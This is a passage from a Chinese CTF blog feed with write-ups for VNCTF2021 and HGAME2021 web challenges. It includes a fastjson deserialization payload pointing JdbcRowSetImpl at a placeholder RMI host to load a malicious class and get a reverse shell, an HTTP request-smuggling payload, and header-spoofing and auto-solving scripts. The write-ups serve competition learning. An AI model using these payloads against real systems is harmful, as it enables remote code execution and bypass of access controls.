punctuation">,</span><span class="token property">"val"</span><span class="token operator">:</span><span class="token string">"com.sun.rowset.JdbcRowSetImpl"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token property">"name"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"com.sun.rowset.JdbcRowSetImpl"</span><span class="token punctuation">,</span><span class="token property">"dataSourceName"</span><span class="token operator">:</span><span class="token string">"rmi://ip:port/Exploit"</span><span class="token punctuation">,</span><span class="token property">"autoCommit"</span><span class="token operator">:</span><span class="token boolean">true</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>;<span class="token comment">// 需要Unicode编码</span></code></pre><img src="/article/VN2021ctf/image-20210315140159832.png" class="" title="image-20210315140159832" loading="lazy"><pre class="language-json" data-language="json"><code class="language-json">roleJson= <span class="token punctuation">&#123;</span><span class="token property">"e"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"\u0040\u0074\u0079\u0070\u0065"</span><span class="token operator">:</span><span class="token string">"\u006a\u0061\u0076\u0061\u002e\u006c\u0061\u006e\u0067\u002e\u0043\u006c\u0061\u0073\u0073"</span><span class="token punctuation">,</span><span class="token property">"val"</span><span class="token operator">:</span><span class="token string">"\u0063\u006f\u006d\u002e\u0073\u0075\u006e\u002e\u0072\u006f\u0077\u0073\u0065\u0074\u002e\u004a\u0064\u0062\u0063\u0052\u006f\u0077\u0053\u0065\u0074\u0049\u006d\u0070\u006c"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token property">"name"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"\u0040\u0074\u0079\u0070\u0065"</span><span class="token operator">:</span><span class="token string">"\u0063\u006f\u006d\u002e\u0073\u0075\u006e\u002e\u0072\u006f\u0077\u0073\u0065\u0074\u002e\u004a\u0064\u0062\u0063\u0052\u006f\u0077\u0053\u0065\u0074\u0049\u006d\u0070\u006c"</span><span class="token punctuation">,</span><span class="token property">"dataSourceName"</span><span class="token operator">:</span><span class="token string">"rmi://ip:port/Exploit"</span><span class="token punctuation">,</span><span class="token property">"\u0061\u0075\u0074\u006f\u0043\u006f\u006d\u006d\u0069\u0074"</span><span class="token operator">:</span><span class="token boolean">true</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>;</code></pre><p>服务器加载了恶意class文件，成功getshell</p><img src="/article/VN2021ctf/image-20210315140505582.png" class="" title="image-20210315140505582" loading="lazy"><p>编码问题，整了一个小时就是反弹不了shell，原来是java反弹shell的编码问题，去<a href="http://www.jackson-t.ca/runtime-exec-payloads.html">网站</a>编码一下就成功了</p><hr><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>孩子好菜，被《简单的签到》搞傻了。查阅了不少资料，拜读了很多大佬的博客，虽然最后还是没做出来，等等WP康康大佬的思路也许比自己忙活半天有用，当然少不了原理的研究。</p><p>继续学习啦</p><p>（想结识更多大佬）</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;比赛昵称：别答了别答了再答人傻了&lt;/p&gt;</summary>
    
    
    
    <category term="Write-Up" scheme="https://err0r.top/categories/Write-Up/"/>
    
    
    <category term="SQL" scheme="https://err0r.top/tags/SQL/"/>
    
    <category term="JAVA" scheme="https://err0r.top/tags/JAVA/"/>
    
  </entry>
  
  <entry>
    <title>HGAME2021</title>
    <link href="https://err0r.top/article/hgame2021/"/>
    <id>https://err0r.top/article/hgame2021/</id>
    <published>2021-02-06T05:59:51.000Z</published>
    <updated>2021-03-30T11:58:02.290Z</updated>
    
    <content type="html"><![CDATA[<p>HAME2021-week 个人WP</p><p>昵称：Err0r</p><a id="more"></a><h1 id="Week1"><a href="#Week1" class="headerlink" title="Week1"></a>Week1</h1><p>这是week1，做了Web和部分Misc，后续会整合成一篇文章(先让我水着)</p><img src="/article/hgame2021/image-20210206151019347.png" class="" title="image-20210206151019347" loading="lazy"><p><strong>由于某些原因，以后会注重原理上的研究</strong></p><hr><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Hitchhiking-in-the-Galaxy"><a href="#Hitchhiking-in-the-Galaxy" class="headerlink" title="Hitchhiking_in_the_Galaxy"></a>Hitchhiking_in_the_Galaxy</h3><p>题目描述： 第一次在银河系里搭顺风车，要准备啥，在线等，挺急的 </p><p>题目地址： <a href="http://hitchhiker42.0727.site:42420/">http://hitchhiker42.0727.site:42420</a> </p><img src="/article/hgame2021/image-20210206151406243.png" class="" title="image-20210206151406243" loading="lazy"><p>抓包看看顺风车啥样</p><img src="/article/hgame2021/image-20210206151614330.png" class="" title="image-20210206151614330" loading="lazy"><p>状态码405Method Not Allowed</p><p>对于任何客户端请求都要进行一套流程，即DNS解析域名返回IP，打开IP套接字(socket)连接IP，再通过套接字写HTTP数据流，最后从WEB服务器接受响应的HTTP数据流。而405状态码就是最后一步生成的，即服务器不响应这种请求方式，请求方式有GET/POST/HEAD/PUT等，换成POST看看。</p><blockquote><p>注意:在burpsuite里面，右键改变请求方式即可</p><img src="/article/hgame2021/image-20210206152237254.png" class="" title="change" loading="lazy"></blockquote><p>随后提示<code>只有使用&quot;无限非概率引擎&quot;(Infinite Improbability Drive)才能访问这里～</code></p><img src="/article/hgame2021/image-20210206152332459.png" class="" title="image-20210206152332459" loading="lazy"><p>这里只要改UA就行了，User-Agent 简单来说就是告诉服务器访问者是通过什么工具来请求的，添加<code>Infinite Improbability Drive</code>或者直接删掉UA只加这个也可以</p><p>随后提示</p><pre class="language-none"><code class="language-none">你知道吗？&lt;a href&#x3D;&quot;https:&#x2F;&#x2F;github.com&#x2F;wuhan005&quot;&gt;茄子&lt;&#x2F;a&gt;特别要求：你得从他的&lt;a href&#x3D;&quot;https:&#x2F;&#x2F;cardinal.ink&#x2F;&quot;&gt;Cardinal&lt;&#x2F;a&gt;过来</code></pre><img src="/article/hgame2021/image-20210206152624452.png" class="" title="image-20210206152624452" loading="lazy"><p>这里是要改Referer，简单来说就是告诉服务器该网页是从哪个页面链接过来的，服务器因此可以获得一些信息用于处理，用法一般是为了防外连接，直接用<code>&lt;a href=&quot;&quot;&gt;</code>，<code>用Submit或&lt;input type=&quot;image&quot;&gt;提交的表单(POST或GET)</code>，或者<code>使用JavaScript提交的[表单](https://baike.baidu.com/item/表单)(POST或GET)</code>都是会带上Referer，当然伪造也很简单。</p><p>最后提示<code>flag仅能通过本地访问获得</code></p><img src="/article/hgame2021/image-20210206153338355.png" class="" title="image-20210206153338355" loading="lazy"><p>很简单的XFF，XFF就是表示客户端最原始的IP地址，也是很容易伪造</p><img src="/article/hgame2021/image-20210206153608572.png" class="" title="image-20210206153608572" loading="lazy"><p>python脚本如下</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token triple-quoted-string string">"""@Time ： 2021/2/6 15:57@Auth ： gyy@Blog ：http://err0r.top"""</span><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"http://hitchhiker42.0727.site:42420/HitchhikerGuide.php"</span>headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">"User-Agent"</span> <span class="token punctuation">:</span> <span class="token string">"Infinite Improbability Drive"</span><span class="token punctuation">,</span>    <span class="token string">"Referer"</span> <span class="token punctuation">:</span> <span class="token string">"https://cardinal.ink/"</span><span class="token punctuation">,</span>    <span class="token string">"X-Forwarded-For"</span> <span class="token punctuation">:</span> <span class="token string">"127.0.0.1"</span><span class="token punctuation">&#125;</span>res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>headers <span class="token operator">=</span> headers<span class="token punctuation">)</span><span class="token punctuation">.</span>text<span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span></code></pre><p>看着直观点</p><hr><h3 id="watermelon"><a href="#watermelon" class="headerlink" title="watermelon"></a>watermelon</h3><p>题目描述： 简单且上头的游戏 </p><p>题目地址 ： <a href="http://watermelon.ryen.xyz:800/">http://watermelon.ryen.xyz:800/</a> </p><p>紧跟潮流的小游戏，作者把源码公开了，所以有很多二创。抢了个一血</p><img src="/article/hgame2021/first.png" class="" title="first" loading="lazy"><p>手快2333</p><img src="/article/hgame2021/image-20210206153657660.png" class="" title="image-20210206153657660" loading="lazy"><p>看到小游戏题，第一眼看js，github搜一圈了解到这个游戏的源码在./src/project.js。但是代码四千行，因为游戏开源，所以很容易能找到分析的源码资料，<a href="https://www.cnblogs.com/xuanyu-10-18/p/14340204.html">参考链接</a>，直接搜到控制分数的代码，改掉</p><img src="/article/hgame2021/image-20210206155153207.png" class="" title="image-20210206155153207" loading="lazy"><p>可以看到这一块3436行<code>default.score</code>是计分块，改成+999999保存，然后把游戏玩结束弹flag</p><img src="/article/hgame2021/image-20210206155459828.png" class="" title="image-20210206155459828" loading="lazy"><hr><h3 id="宝藏走私者"><a href="#宝藏走私者" class="headerlink" title="宝藏走私者"></a>宝藏走私者</h3><p>题目描述： </p><p><strong>资料：<a href="https://paper.seebug.org/1048/">https://paper.seebug.org/1048/</a></strong><br>宝藏走私者 Switch 喜欢偷盗并将奇特的宝藏走私到一些黑市商家手中。<br>为了阻止其继续作恶，警探 Liki 奉命将 Switch 抓捕归案。<br>调查过程中，Liki 发现 Switch 将一个秘密藏在了一个私人服务器中。<br>这或许会成为后续追查 Switch 的重大线索，你能找到这个秘密吗？ </p><p>题目链接： <a href="http://thief.0727.site/">http://thief.0727.site:80</a> </p><p><strong>hint: 注意留意服务器信息</strong> </p><p>HTTP请求走私，资料里讲的很详细，建议仔细读一下，这里不做过多阐述</p><p>payload：</p><pre class="language-none"><code class="language-none">GET &#x2F; HTTP&#x2F;1.1Host: thief.0727.sitePragma: no-cacheCache-Control: no-cacheUpgrade-Insecure-Requests: 1User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;88.0.4324.104 Safari&#x2F;537.36Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q&#x3D;0.9Content-Length: 95Transfer-Encoding: chunked0GET &#x2F;secret HTTP&#x2F;1.1Content-Length: 30Host: thief.0727.siteClient-IP: 127.0.0.11</code></pre><img src="/article/hgame2021/image-20210206161847925.png" class="" title="image-20210206161847925" loading="lazy"><hr><h3 id="智商检测鸡"><a href="#智商检测鸡" class="headerlink" title="智商检测鸡"></a>智商检测鸡</h3><p>题目描述： 又有谁不爱高数呢？反正我不爱（请使用firefox浏览器打开题目） </p><p>题目地址： <a href="http://r4u.top:5000/">http://r4u.top:5000/</a> </p><p>又到了写脚本环节，首先看下题目</p><img src="/article/hgame2021/image-20210206162112398.png" class="" title="image-20210206162112398" loading="lazy"><p>我大概是假的大学生</p><p>先找题目，全是ax+b的形式，那就挺好办的，找源码看看怎么取数字</p><img src="/article/hgame2021/image-20210206162233545.png" class="" title="image-20210206162233545" loading="lazy"><p>应该还是挺好取的，但是开始写脚本发现GET请求不到，应该是对接api的，果然在Sources里面找到了个<code>fuckmath.js</code></p><pre class="language-js" data-language="js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">getStatus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    $<span class="token punctuation">.</span><span class="token function">ajax</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>        type<span class="token operator">:</span><span class="token string">"GET"</span><span class="token punctuation">,</span>        url<span class="token operator">:</span> <span class="token string">"/api/getStatus"</span><span class="token punctuation">,</span>        dataType<span class="token operator">:</span><span class="token string">"json"</span><span class="token punctuation">,</span>        <span class="token function-variable function">success</span><span class="token operator">:</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">let</span> solving <span class="token operator">=</span> data<span class="token punctuation">[</span><span class="token string">'solving'</span><span class="token punctuation">]</span>            <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#status"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span>solving<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>solving <span class="token operator">===</span> <span class="token number">100</span><span class="token punctuation">)</span>                <span class="token function">getFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">getQuestion</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    $<span class="token punctuation">.</span><span class="token function">ajax</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>        type<span class="token operator">:</span> <span class="token string">"GET"</span><span class="token punctuation">,</span>        url<span class="token operator">:</span> <span class="token string">"/api/getQuestion"</span><span class="token punctuation">,</span>        dataType<span class="token operator">:</span> <span class="token string">"json"</span><span class="token punctuation">,</span>        xhrFields<span class="token operator">:</span> <span class="token punctuation">&#123;</span>            withCredentials<span class="token operator">:</span> <span class="token boolean">true</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        crossDomain<span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token function-variable function">success</span><span class="token operator">:</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#integral'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">html</span><span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token string">'question'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">getFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    $<span class="token punctuation">.</span><span class="token function">ajax</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>        type<span class="token operator">:</span> <span class="token string">"GET"</span><span class="token punctuation">,</span>        url<span class="token operator">:</span> <span class="token string">"/api/getFlag"</span><span class="token punctuation">,</span>        dataType<span class="token operator">:</span> <span class="token string">"json"</span><span class="token punctuation">,</span>        <span class="token function-variable function">success</span><span class="token operator">:</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#flag'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">html</span><span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token string">'flag'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">getQuestion</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">getStatus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">submit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    $<span class="token punctuation">.</span><span class="token function">ajax</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>    type<span class="token operator">:</span> <span class="token string">"POST"</span><span class="token punctuation">,</span>    url<span class="token operator">:</span> <span class="token string">"/api/verify"</span><span class="token punctuation">,</span>    data<span class="token operator">:</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>answer<span class="token operator">:</span><span class="token function">parseFloat</span><span class="token punctuation">(</span><span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#answer'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">val</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    dataType<span class="token operator">:</span> <span class="token string">"json"</span><span class="token punctuation">,</span>    contentType<span class="token operator">:</span> <span class="token string">"application/json;charset=utf-8"</span><span class="token punctuation">,</span>    xhrFields<span class="token operator">:</span> <span class="token punctuation">&#123;</span>        withCredentials<span class="token operator">:</span> <span class="token boolean">true</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    crossDomain<span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>    <span class="token function-variable function">success</span><span class="token operator">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token string">'result'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#alert'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">html</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">                &lt;div class="alert alert-success">\n                    &lt;strong>Right!&lt;/strong>\n                &lt;/div></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#alert'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">html</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">                &lt;div class="alert alert-danger">\n                    &lt;strong>Wrong!&lt;/strong>\n                &lt;/div></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>应该是通过<code>./api/getStatus</code>检查做题情况，<code>./api/getQuestion</code>加载题目，<code>./api/verify</code>交答案，最后<code>./api/getFlag</code>拿flag</p><p>直接访问<code>./api/getFlag</code>看看？</p><img src="/article/hgame2021/image-20210206162746009.png" class="" title="image-20210206162746009" loading="lazy"><p>被骂了555…应该是检查session看做题情况，其他都访问一下看看</p><img src="/article/hgame2021/image-20210206162926231.png" class="" title="image-20210206162926231" loading="lazy"><img src="/article/hgame2021/image-20210206162952785.png" class="" title="image-20210206162952785" loading="lazy"><p>最后确认答案是<code>answer</code>，开始写脚本</p><img src="/article/hgame2021/image-20210206163154279.png" class="" title="image-20210206163154279" loading="lazy"><p>赶时间，没搞正则，凑合着用用吧，蹩脚编程勿喷2333</p><p>payload:</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token triple-quoted-string string">"""@Time ： 2021/1/30 21:20@Auth ： gyy@Blog ：http://err0r.top"""</span><span class="token keyword">import</span> requests<span class="token keyword">from</span> sympy <span class="token keyword">import</span> symbols<span class="token punctuation">,</span> integrate<span class="token keyword">import</span> jsonurl <span class="token operator">=</span> <span class="token string">"http://r4u.top:5000"</span><span class="token comment"># print(requests.get(url))</span>session <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">jifen</span><span class="token punctuation">(</span>shangxian<span class="token punctuation">,</span> xiaxian<span class="token punctuation">,</span> a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">:</span>    x <span class="token operator">=</span> symbols<span class="token punctuation">(</span><span class="token string">"x"</span><span class="token punctuation">)</span>    A <span class="token operator">=</span> integrate<span class="token punctuation">(</span>a <span class="token operator">*</span> x <span class="token operator">+</span> b<span class="token punctuation">,</span> <span class="token punctuation">(</span>x<span class="token punctuation">,</span> xiaxian<span class="token punctuation">,</span> shangxian<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> A<span class="token keyword">def</span> <span class="token function">req</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> data <span class="token operator">==</span> <span class="token string">"get"</span><span class="token punctuation">:</span>        res <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> headers<span class="token operator">=</span><span class="token punctuation">&#123;</span>            <span class="token string">"User-Agent"</span><span class="token punctuation">:</span> <span class="token string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span>            <span class="token string">'utf8'</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> res<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&#123;"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&#125;"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"\"question\":\"&lt;math>"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&lt;/math>\"&#125;"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        res <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">,</span> headers<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"Content-Type"</span><span class="token punctuation">:</span> <span class="token string">"application/json"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span>            <span class="token string">'utf8'</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> res<span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    res <span class="token operator">=</span> req<span class="token punctuation">(</span>url <span class="token operator">+</span> <span class="token string">"/api/getQuestion"</span><span class="token punctuation">,</span> <span class="token string">"get"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"&lt;mrow>"</span><span class="token punctuation">)</span>    <span class="token comment"># print(res)</span>    xiaxian <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>        res<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&lt;mo>"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&lt;/mo>"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&lt;mn>"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&lt;/mn>"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&lt;/mrow>"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment"># print(xiaxian)</span>    shangxian <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>        res<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"&lt;/msubsup>"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&lt;mo>"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&lt;/mo>"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&lt;mn>"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&lt;/mn>"</span><span class="token punctuation">,</span>                                                                                                           <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span>            <span class="token string">"&lt;/mrow>"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment"># print(shangxian)</span>    a <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>        res<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"("</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"x"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&lt;mo>"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&lt;/mo>"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&lt;mn>"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&lt;/mn>"</span><span class="token punctuation">,</span>                                                                                                                <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span>            <span class="token string">"&lt;/mrow>"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&lt;mi>"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment"># print(a)</span>    b <span class="token operator">=</span> <span class="token builtin">float</span><span class="token punctuation">(</span>        res<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"+"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">")"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&lt;mo>"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&lt;/mo>"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&lt;mn>"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&lt;/mn>"</span><span class="token punctuation">,</span>                                                                                                                <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span>            <span class="token string">"&lt;/mrow>"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment"># print(b)</span>    ans <span class="token operator">=</span> jifen<span class="token punctuation">(</span>shangxian<span class="token punctuation">,</span> xiaxian<span class="token punctuation">,</span> a<span class="token punctuation">,</span> b<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>ans<span class="token punctuation">)</span>    data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"answer"</span><span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">(</span>ans<span class="token punctuation">)</span><span class="token punctuation">&#125;</span>    upans <span class="token operator">=</span> req<span class="token punctuation">(</span>url <span class="token 